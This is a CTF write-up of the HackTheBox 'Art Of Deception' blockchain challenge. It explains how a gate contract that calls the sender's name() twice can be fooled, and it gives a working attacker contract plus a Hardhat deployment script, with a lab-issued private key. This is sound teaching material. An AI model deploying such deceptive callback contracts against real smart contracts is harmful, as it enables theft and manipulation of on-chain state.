+++
date = "2023-03-23"
author = "biplavxyz"
title = "The Art Of Deception - Implementing Function Of Target Contract With Interface Using Hardhat - HackTheBox Cyber Apocalypse CTF - 2023"
+++

Greetings :)

This writeup is going to be about `The Art Of Deception` challenge from HackTheBox Cyber Apocalypse CTF - 2023.  
This is a beginner friendly blockchain challenge.   

We were gieven a `RPC` connection info, `Private Key` of a wallet, and `Address` of that wallet with `5 ETH` for gas fees.  
`RPC` is used for connecting, interacting and querying of the blockchain data.
We were also given deployed addresses for two smart contracts `Setup.sol` and `FortifiedPerimeter.sol` which are provided below. 

`Setup.sol`
```python
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {HighSecurityGate} from "./FortifiedPerimeter.sol";

contract Setup {
    HighSecurityGate public immutable TARGET;

    constructor() {
        TARGET = new HighSecurityGate();
    }

    function isSolved() public view returns (bool) {
        return TARGET.strcmp(TARGET.lastEntrant(), "Pandora");
    }
}
```

`FortifiedPerimeter.sol`
```python
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.18;

interface Entrant {
    function name() external returns (string memory);
}

contract HighSecurityGate {

    string[] private authorized = ["Orion", "Nova", "Eclipse"];
    string public lastEntrant;

    function enter() external {
        Entrant _entrant = Entrant(msg.sender);

        require(_isAuthorized(_entrant.name()), "Intruder detected");
        lastEntrant = _entrant.name();
    }

    function _isAuthorized(string memory _user) private view returns (bool){
        for (uint i; i < authorized.length; i++){
            if (strcmp(_user, authorized[i])){
                return true;
            }
        }
        return false;
    }

    function strcmp(string memory _str1, string memory _str2) public pure returns (bool){
        return keccak256(abi.encodePacked(_str1)) == keccak256(abi.encodePacked(_str2));
    }
}
```

The goal of the challenge was to return true from the `isSolved()` function of the deployed `Setup` contract.
For that function to return `true`, the goal was to set the value of variable `lastEntrant` in the `HighSecurityGate` contract to `Pandora`.


# Environment Setup:
I decided to use `hardhat` for this project. 

Steps to setup the project are stated below:

1. `mkdir DeceptionArtist`
2. `cd DeceptionArtist`
3. `npm install --save-dev hardhat`
4. `npx hardhat`

Those steps will provide ready to use hardhat project. 

Next step would be to delete all the sample files under `contract`, `scripts` and `test` directories, and `hardhat.config.js` file.

`rm -rf ./contracts/* ; rm -rf ./test/* ; rm -rf ./scripts/* ; rm hardhat.config.js` 

Let's create our `hardhat.config.js` file from scratch. 

```javascript
require("@nomicfoundation/hardhat-toolbox");

const PRIVATE_KEY = "0x6e4a7c3122c53e552b8901a90dd0d6104bdda6376fc163e6d25a7b5cbbe165bd";


module.exports = {
  solidity: "0.8.18",

  defaultNetwork: "HTB",
  networks: {
    hardhat: {
    },
    HTB: {
      url: "http://165.232.98.59:31195/",
      gas: 2100000,
      gasPrice: 8000000000,
      accounts: [PRIVATE_KEY]
    }
  },
};
```

In the given hardhat config file, first, we add required `hardhat-toolbox` library. Then, we assign the provided private key to `PRIVATE_KEY` variable.

After that within `module.exports` we assign solidity verison, and also the network that was provided. I named the network `HTB`, and also added gas related information so that the transaction that need more gas fee than the normal transaction can go through easily.

It's time to understand how the given `HighSecurityGate` contract can be pwned ;)
# Code Analysis
We can see the code for the `HighSecurityGate` contract here:
![1](/deception1.png)

Let's go through each line.
1. First of all, license information is defined in line number one.
2. Solidity version is defined in line number 2.
3. Line `4 - 6` defines interface named `Entrant`. This is very important section for this challenge.
In solidity, an `interface` is basically prototype or description of all the functions that an object must have to operate. It cannot have functions implemented within it, but rather functions implement the given interface. It also cannot have state variable or constructors.
In the given contract, the name of our Interface is `Entrant`, and it has definition for function named `name()` which doesn't take any parameter, has `external` visibility and returns `string`.
4. Then, from line `8` we start `HighSecurityGate` contract.
5. In line number `10`, a `string array` named `authorized` is declared with three hardcoded names `Orion`, `Nova`, and `Eclipse`.
6. In line `11`, a variable named `lastEntrant` of type `string` is declared.
7. In line `13` function named `enter()` is defined which is `external`. Inside that function, the bug occurs.
8. In line `14`, the `msg.sender` is casted into an instance of the `Entrant` interface that has `name` function. Since it creates interface instance with
`msg.sender` we can create our attacker contract and call this `name()` function from there as `msg.sender` is the contract or account that calls the function. As interfaces allow us to implement the functions, we can setup our own `name()` function in the `attacker` contract and call `enter()` function of the target contract with our `attacker` contract.
9. In line `16`, a checking is done to ensure that the `keccak256` has of the  `name()` function returns a value that matches `keccak256` hash of one of the values in `authorized` array. If it matches, it continues, otherwise returns `Intruder detected` and reverts.
10. Finally. line `17` sets the value of `lastEntrant` to the value that is returned by calling `name()` function **`AGAIN`**.

# Vulerability
The problem is that the `msg.sender` is being used to create instance using interface. Furthermore, `_entrant.name()` is calling the `name()` function of the created instance `twice`. So, in the first call to the `name()` function, we can return the value `Nova` to pass the `require()` statement. And in the second call to the `name()` function, we can return the value `Pandora` which sets the value of variable `lastEntrant` to `Pandora`. That solves the challenge.


# Our Attacker Contract
```python
// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

interface Entrant {
    function name() external returns (string memory);
}

contract Hecker is Entrant{

  address public TargetContract = 0x50067D3BB09E1E7130e19D8876be00D16cBB7dfF;

  bool isFirstCall = true;

  function name() external returns (string memory) {

    if (isFirstCall) {
        isFirstCall = false;
        return "Nova";
    } else {
        return "Pandora";
    }
}

  function enterCall() external {
    (bool success,) = address(TargetContract).call(
            abi.encodeWithSignature("enter()")
        );
    require(success, "call to target contract failed");
  }
}
```
In this `Hecker` contract, we use same interface as in the `HighSecurityGate` contract. Then, `TargetContract` is defined which is the address of the deployed
`HighSecurityGate` contract. I defined `bool isFirstCall = true` which is used to modify condition in `if-else` block later to return different values for `name()` function call. Then, `name()` function is defined which checks if `isFirstcall` is true, and thus returns `Nova` in the first call which passes the `require()` check. After that, when `name()` function is called again while setting the value of `lastEntrant` variable, this function returns `Pandora`. It sets the value of `lastEntrant` to `Pandora`.Finally, the call to the target contract is done within `enterCall()` function which makes call to the target contract using `call()` function.

# Javascript code to interact, deploy, and call the functions:
```javascript
const { ethers } = require("hardhat");

async function main() {

    // Get deployer account
    const [deployer] = await ethers.getSigners();

    // Deployer's Balance
    console.log('Interacting with the account: ' + deployer.address);
    console.log("Account balance:", (await deployer.getBalance()).toString());

    // Access Setup contract
    const Setup = "0xb7771807BA9845F52FeB155bf812F49c3c40F5b2";
    const setup = await ethers.getContractAt("Setup", Setup);
    console.log( "Setup Contract Address: " + Setup);

    // Access HighSecurityGate contract
    const HighSecurityGate = "0x50067D3BB09E1E7130e19D8876be00D16cBB7dfF";
    const highsecuritygate = await ethers.getContractAt("HighSecurityGate", HighSecurityGate);
    console.log( "HighSecurityGate Contract Address: " + HighSecurityGate);

    // Before attack
    last = await highsecuritygate.lastEntrant()
    console.log("Last Entrant Value = ", last);

    // Call solved function
    solved = await setup.isSolved();
    console.log("Is Solved: " + solved);

    // // Deploy Attacker Contract
    const Hecker = await ethers.getContractFactory("Hecker");
    const hecker = await Hecker.deploy();
    console.log("Hacker Contract deployed at:", hecker.address);

    // Call Attacker contract's method
    await hecker.enterCall();

    // After attack
    last = await highsecuritygate.lastEntrant()
    console.log("Last Entrant Value = ", last);

    // After attack
    solved = await setup.isSolved();
    console.log("Is Solved: " + solved);

    if(String(solved) === String("true")){
      console.log("Successfully Changed to Pandora. :) ")
      console.log("PWNED Successfully")
  } else {
    console.log("Not Yet")
  }
}

main()
    .then(() => process.exit())
    .catch(error => {
        console.error(error);
        process.exit(1);
})
```

I have my script under `scripts` directory, and contracts under `contracts` directory.

`npx hardhat compile; npx hardhat run scripts/scriptname.js` compiles all of the contracts and runs the script.

Here is a gif showing the process:

![1](/DeceptionArtist.gif)

Hope this was helpful.
Thanks for reading.

Happy Learning :) 
